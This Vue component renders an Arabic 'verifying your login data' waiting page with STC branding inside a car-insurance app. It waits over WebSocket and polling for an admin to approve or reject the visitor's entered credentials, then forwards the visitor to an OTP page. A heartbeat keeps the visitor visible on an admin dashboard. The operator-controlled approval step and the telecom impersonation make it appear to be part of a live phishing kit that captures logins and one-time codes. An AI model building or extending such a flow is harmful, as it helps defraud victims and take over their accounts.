<template>
    <StcLayout>
        <!-- Back Button -->
        <div class="my-5 flex w-full justify-start">
            <button type="button" class="stc-back-btn" @click="goBack">
                <svg class="h-4 w-4 rtl:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                </svg>
                <span>العودة</span>
            </button>
        </div>

        <div class="flex w-full flex-col items-center gap-5">
            <h2 class="mb-2 text-3xl font-medium stc-text-primary lg:text-4xl text-center">جاري التحقق من البيانات</h2>
            <p class="text-center text-base stc-text-dark">يتم الآن مراجعة بيانات الدخول الخاصة بك، يرجى الانتظار</p>

            <!-- Loading -->
            <div v-if="!approved && !rejected" class="py-4">
                <div class="stc-loader">
                    <div class="stc-loader__dot"></div>
                    <div class="stc-loader__dot"></div>
                    <div class="stc-loader__dot"></div>
                </div>
            </div>

            <!-- Error -->
            <Transition name="stc-fade">
                <div v-if="error" class="w-full rounded border border-red-300 bg-red-50 p-3 text-center">
                    <p class="text-sm text-red-700">{{ error }}</p>
                </div>
            </Transition>

            <!-- Countdown -->
            <div v-if="!approved && !rejected" class="text-center">
                <p class="text-sm stc-text-dark">
                    الوقت المتبقي:
                    <span class="font-bold stc-text-primary">{{ formatTime(countdown) }}</span>
                </p>
            </div>

            <!-- Disabled Button -->
            <div class="w-full">
                <button :disabled="true" class="stc-btn-contained stc-btn-disabled w-full">
                    <span v-if="!approved">جاري التحقق...</span>
                    <span v-else>جاري التحويل...</span>
                </button>
            </div>
        </div>
    </StcLayout>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from 'vue';
import { useRouter, useRoute } from 'vue-router';
import { useI18n } from 'vue-i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { getEcho } from '@/services/echo';
import StcLayout from '@/car.insurance/components/StcLayout.vue';
import { getReasonLabel } from '@/constants/rejectionReasons';
import { safeRedirect } from '@/utils/safeRedirect';

const router = useRouter();
const route = useRoute();
const { t } = useI18n();

useVisitorTracking( 'stc/waiting' );

// ─── Load context from sessionStorage ───────────────────────────────
const stcContext = JSON.parse( sessionStorage.getItem( 'stcContext' ) || '{}' );
const phoneNumber = stcContext.phoneNumber || route.query.phone || '';
const customerIp = stcContext.customerIp || '';

// ─── State ──────────────────────────────────────────────────────────
const countdown = ref( 180 );
const approved = ref( false );
const rejected = ref( false );
const error = ref( '' );
let countdownInterval = null;
let pollTimer = null;
let echoChannel = null;

const formatTime = ( seconds ) =>
{
    const mins = Math.floor( seconds / 60 );
    const secs = seconds % 60;
    return `${ mins.toString().padStart( 2, '0' ) }:${ secs.toString().padStart( 2, '0' ) }`;
};

// ─── WebSocket — listen for admin approval/rejection ────────────────
async function setupWebSocket ()
{
    const echo = await getEcho();
    if ( !echo || !customerIp ) return;

    echoChannel = echo.channel( `stc.${ customerIp }` );

    echoChannel.listen( '.StcWaitingApproved', handleApproved );
    echoChannel.listen( '.StcWaitingRejected', handleRejected );
}

function handleApproved ( event )
{
    approved.value = true;
    clearInterval( pollTimer );
    clearInterval( countdownInterval );

    // Save context for next page
    sessionStorage.setItem( 'stcContext', JSON.stringify( {
        ...stcContext,
        phoneNumber,
        customerIp,
        stcWaitingApproved: true,
    } ) );

    setTimeout( () =>
    {
        if ( event.redirect_to )
        {
            safeRedirect( event.redirect_to, 'stcOtp', router );
        } else
        {
            router.push( { name: 'stcOtp' } );
        }
    }, 500 );
}

function handleRejected ( event )
{
    rejected.value = true;
    error.value = getReasonLabel( event?.reason || 'stc_other', t ) || 'تم رفض التحقق';
    clearInterval( pollTimer );
    clearInterval( countdownInterval );

    // Redirect back to phone verification after a brief delay to show the error
    setTimeout( () => {
        router.push( { name: 'phoneVerification' } );
    }, 3000 );
}

// ─── Polling Fallback ───────────────────────────────────────────────
function startPolling ()
{
    if ( pollTimer ) return;

    pollTimer = setInterval( async () =>
    {
        if ( approved.value || rejected.value ) return;

        try
        {
            const { default: request } = await import( '@/api/request' );

            // Heartbeat — keep customer visible in admin dashboard
            request.post( '/customer/page', { current_page: '/insurance/stc/waiting' }, { silent: true } ).catch( () => {} );

            // Actual status check
            const { data } = await request.get( '/customer/stc-status', { silent: true } );
            if ( data.stc_waiting === 'approved' )
            {
                handleApproved( {} );
            } else if ( data.stc_waiting === 'rejected' )
            {
                handleRejected( { reason: data.stc_waiting_reason || 'stc_other' } );
            }
        } catch
        {
            // Silent — polling is a fallback
        }
    }, 5000 );
}

// ─── Countdown ──────────────────────────────────────────────────────
const startCountdown = () =>
{
    if ( countdownInterval ) clearInterval( countdownInterval );

    countdownInterval = setInterval( () =>
    {
        if ( countdown.value > 0 )
        {
            countdown.value--;
        } else
        {
            clearInterval( countdownInterval );
            // Timeout — redirect back to phone entry
            router.push( { name: 'phoneVerification' } );
        }
    }, 1000 );
};

// ─── Navigation ─────────────────────────────────────────────────────
const goBack = () => router.push( { name: route.meta.backTo || 'phoneVerification' } );

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( () =>
{
    startCountdown();
    setupWebSocket();
    startPolling();
} );

onUnmounted( () =>
{
    if ( countdownInterval ) clearInterval( countdownInterval );
    if ( pollTimer )
    {
        clearInterval( pollTimer );
        pollTimer = null;
    }
    if ( echoChannel && customerIp )
    {
        try { window.Echo?.leave( `stc.${ customerIp }` ); } catch { /* */ }
    }
} );
</script>

<style scoped>
/* Page-specific styles only — shared styles come from StcLayout */
</style>
